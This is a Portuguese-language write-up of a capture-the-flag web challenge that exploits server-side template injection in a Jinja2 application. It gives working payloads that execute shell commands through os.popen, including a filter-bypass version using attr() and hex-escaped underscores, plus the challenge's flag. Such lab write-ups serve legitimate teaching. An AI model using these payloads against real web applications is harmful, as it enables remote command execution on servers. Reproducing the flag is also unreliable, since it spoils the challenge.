# [SST2]

###### Resolvido por @[SebastiaoKomada]

> Desafio Web Exploitation

## Sobre o Desafio

O enunciado apresenta a seguinte descrição: *"Criei um site bacana onde você pode anunciar o que quiser! Li sobre a higienização de entradas, então agora removo qualquer tipo de caractere que possa ser um problema :)
Mais detalhes estarão disponíveis após o lançamento da sua instância de desafio."*.
Junto a isso, foram disponibilizadas duas dicas: *"Server Side Template Injection"* e *"Por que colocar caracteres na lista negra é uma má ideia para higienizar entradas?"*.

A pista indica que o desafio envolve uma injeção de código processado pelo servidor com algum nível de higienização, permitindo a extração da flag.

## Solução

### Primeiros testes

Ao acessar o sistema web, é exibida uma página com um campo de entrada solicitando o conteúdo do anúncio:  
<img width="1470" height="803" alt="Captura de Tela 2025-09-23 às 15 55 07" src="https://github.com/user-attachments/assets/05ba0631-4dfc-4b0b-98cd-07dc8b25e956" />

Verifica-se que o formulário realiza um envio via método `POST` para a rota `/`, transmitindo o valor do campo `content` ao servidor.

Quando qualquer valor é submetido (por exemplo, `ola`), a aplicação responde com uma nova página exibindo o texto informado:  
<img width="1466" height="759" alt="Captura de Tela 2025-09-23 às 15 58 50" src="https://github.com/user-attachments/assets/08a34890-445f-4b81-aa39-0fa92a6f4a47" />

A engine de template detectada foi **Jinja2**. Ao enviar a expressão `{{10*10}}`, a aplicação devolveu a expressão e retornou o resultado na resposta:  
<img width="1470" height="760" alt="Captura de Tela 2025-09-23 às 16 02 11" src="https://github.com/user-attachments/assets/297812bb-c2c0-4bde-a79a-0119397e8d4e" />

Foram pesquisados payloads capazes de escalar a injeção até a execução de comandos no servidor. A principal referência consultada foi:
https://onsecurity.io/article/server-side-template-injection-with-jinja2/

Como primeiro teste de exploração, foi enviado o payload direto:
`
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}
`

Ao submeter esse payload, a aplicação bloqueou caracteres usados na sintaxe direta (pontos, underscores e colchetes), retornando uma página com comportamento de sanitização aplicada:  
<img width="1470" height="764" alt="Captura de Tela 2025-09-23 às 17 59 31" src="https://github.com/user-attachments/assets/ce0e0d7b-a6ae-49de-a176-d3f1bec2a9ab" />

Observando esse bloqueio, adotou-se uma versão do payload que utiliza filtros e `attr` para contornar a sanitização (evitando `.` e `_` literais):
`
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
`

Esse payload retornou a listagem de arquivos presentes no diretório, confirmando a possibilidade de executar comandos no servidor:  
<img width="1468" height="756" alt="Captura de Tela 2025-09-23 às 18 02 07" src="https://github.com/user-attachments/assets/566a3357-e215-4c72-8e46-a86b26296804" />

A partir da listagem, foi identificado o arquivo `flag`. Para ler seu conteúdo, foi utilizado:
`
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
`

O envio revelou o conteúdo da flag:  
<img width="1470" height="757" alt="Captura de Tela 2025-09-23 às 18 03 09" src="https://github.com/user-attachments/assets/2e7b47b4-f6e7-458f-bce2-62c0023a7ef6" />

### Flag encontrada

Com isso, foi possível identificar a flag escondida:

**Flag:**  
`picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}`
